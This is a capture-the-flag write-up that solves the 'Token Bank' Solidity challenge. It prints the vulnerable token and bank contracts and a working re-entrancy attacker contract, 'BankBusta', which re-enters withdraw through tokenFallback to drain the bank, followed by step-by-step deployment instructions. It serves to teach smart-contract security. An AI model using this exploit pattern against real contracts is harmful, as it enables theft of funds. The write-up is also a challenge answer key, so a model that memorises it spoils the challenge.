# Token Bank

**HINT:** The contract has a re-entrancy issue create a contract to rob the bank
<details>
<summary>Part 1</summary>
<p>

create a contract that takes advantage of withdrawing everything in the bank like so:

```
pragma solidity ^0.4.21;

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes data) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping (address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function SimpleERC223Token() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(address to, uint256 value, bytes data) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    function TokenBankChallenge(address player) public {
        token = new SimpleERC223Token();

        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10**18;  // half for me
        balanceOf[player] = 500000 * 10**18;      // half for you
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(this) == 0;
    }

    function tokenFallback(address from, uint256 value, bytes) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        balanceOf[msg.sender] -= amount;
    }
}


contract BankBusta {
    bool stop = false;
    uint8 counter = 0;
    TokenBankChallenge bankCode;
    
    function callcode(address _addr) {
        bankCode = TokenBankChallenge(address(_addr));
    }
    
    function transferToTokenBank(address tokenaddr, address transferTo) public {
        SimpleERC223Token token = SimpleERC223Token(tokenaddr);
        token.transfer(transferTo, 500000000000000000000000);
    }
    
    function execute() {
        bankCode.withdraw(500000000000000000000000);
    }
    
    function tokenFallback(address from, uint256 value, bytes) public {
        if (counter == 0 || counter ==2) {
            counter += 1;
        } else {
            counter += 1;
            bankCode.withdraw(500000000000000000000000);
        }
    }
}
```

</p>
</details>

<details>
<summary>Part 2</summary>
<p>

Withdraw ```500000000000000000000000``` from the bank contract, open MetaMask and send ```500000000000000000000000``` to the deployed bank attacker contract

</p>
</details>

<details>
<summary>Part 3</summary>
<p>

* Call the function ```callcode()``` and put the token bank's address
* Call the function ```transferToTokenBank()``` put the SET address and token bank address in
* Call the function ```execute```

</p>
</details>